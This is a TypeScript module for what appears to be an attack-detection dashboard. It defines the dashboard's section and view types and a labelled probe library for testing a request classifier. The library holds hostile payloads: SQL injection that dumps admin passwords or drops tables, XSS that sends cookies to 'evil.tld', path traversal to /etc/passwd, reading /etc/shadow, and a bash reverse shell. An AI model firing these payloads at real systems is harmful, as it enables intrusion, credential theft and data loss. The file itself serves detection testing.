import type { BatchProbe, DashboardApi, DashboardSnapshot, EventRecord } from "../api";
import type { Tone } from "./format";
import type { StreamState } from "./useEventStream";

export type Section =
  | "Overview"
  | "Live Attacks"
  | "Requests"
  | "Request Visualizer"
  | "Escalations"
  | "Generator"
  | "Models"
  | "Training"
  | "Research"
  | "Redis Cache"
  | "Model Lab"
  | "Timing"
  | "RL Training"
  | "Policy"
  | "Access Control"
  | "Applications"
  | "Network"
  | "Review"
  | "Services"
  | "Audit"
  | "Settings";
export type ToolRun={id:string;kind:string;count:number;results:unknown[];summary?:Record<string,unknown>;stop?:()=>void};

export type ViewProps = {
  runs:ToolRun[];
  recordRun:(run:ToolRun)=>void;
  snapshot: DashboardSnapshot;
  selected?: EventRecord;
  select: (event: EventRecord) => void;
  api: DashboardApi;
  mutate: (action: () => Promise<unknown>, success: string) => Promise<void>;
  notify: (title: string, detail?: string, tone?: Tone) => void;
  refresh: () => Promise<void>;
  username: string;
  goTo: (section: Section) => void;
  signOut: () => void;
  stream: { state: StreamState; received: number; lastEventAt?: Date };
  streamEnabled: boolean;
  setStreamEnabled: (enabled: boolean) => void;
  refreshInterval: number;
  setRefreshInterval: (seconds: number) => void;
  liveIds: Set<string>;
};

/** Payload library used by the model playground and the gateway replay. Each entry is a well-known probe shape. */
export const PROBE_LIBRARY: (BatchProbe & { family: string })[] = [
  { family: "Baseline", label: "Product search", method: "GET", path: "/search", query: "q=wireless+keyboard", expected: "BENIGN" },
  { family: "Baseline", label: "Landing page", method: "GET", path: "/public/hello", query: "", expected: "BENIGN" },
  { family: "Baseline", label: "Paginated list", method: "GET", path: "/search", query: "q=laptop&page=3&sort=price", expected: "BENIGN" },
  { family: "Baseline", label: "JSON echo", method: "POST", path: "/api/echo", body: '{"note":"quarterly report ready"}', expected: "BENIGN" },

  { family: "SQL injection", label: "Tautology", method: "GET", path: "/search", query: "q=1' OR '1'='1", expected: "SQL_INJECTION" },
  { family: "SQL injection", label: "Union select", method: "GET", path: "/search", query: "q=x' UNION SELECT username,password FROM admin_users--", expected: "SQL_INJECTION" },
  { family: "SQL injection", label: "Stacked drop", method: "POST", path: "/api/echo", body: '{"q":"1; DROP TABLE orders;--"}', expected: "SQL_INJECTION" },
  { family: "SQL injection", label: "Blind timing", method: "GET", path: "/search", query: "q=1' AND SLEEP(5)--", expected: "SQL_INJECTION" },

  { family: "Cross-site scripting", label: "Inline script", method: "GET", path: "/search", query: "q=<script>alert(document.cookie)</script>", expected: "XSS" },
  { family: "Cross-site scripting", label: "Image handler", method: "GET", path: "/search", query: "q=<img src=x onerror=fetch('//evil.tld/'+document.cookie)>", expected: "XSS" },
  { family: "Cross-site scripting", label: "SVG payload", method: "POST", path: "/api/echo", body: '{"bio":"<svg/onload=alert(1)>"}', expected: "XSS" },

  { family: "Directory traversal", label: "Unix passwd", method: "GET", path: "/search", query: "q=../../../../etc/passwd", expected: "DIRECTORY_TRAVERSAL" },
  { family: "Directory traversal", label: "Encoded traversal", method: "GET", path: "/search", query: "q=%2e%2e%2f%2e%2e%2fwindows%2fwin.ini", expected: "DIRECTORY_TRAVERSAL" },

  { family: "Remote code execution", label: "Shell chain", method: "GET", path: "/search", query: "q=test;cat /etc/shadow", expected: "REMOTE_CODE_EXECUTION" },
  { family: "Remote code execution", label: "Reverse shell", method: "POST", path: "/api/echo", body: '{"cmd":"|bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"}', expected: "REMOTE_CODE_EXECUTION" },

  { family: "Cookie injection", label: "Session forge", method: "GET", path: "/search", query: "q=1&session=admin%3Btrue%3Brole%3Dsuperuser", expected: "COOKIE_INJECTION" },
  { family: "Credential attack", label: "Login attempt", method: "POST", path: "/login", body: '{"username":"admin","password":"admin123"}', expected: "BENIGN" }
];

export const PROBE_FAMILIES = [...new Set(PROBE_LIBRARY.map((probe) => probe.family))];
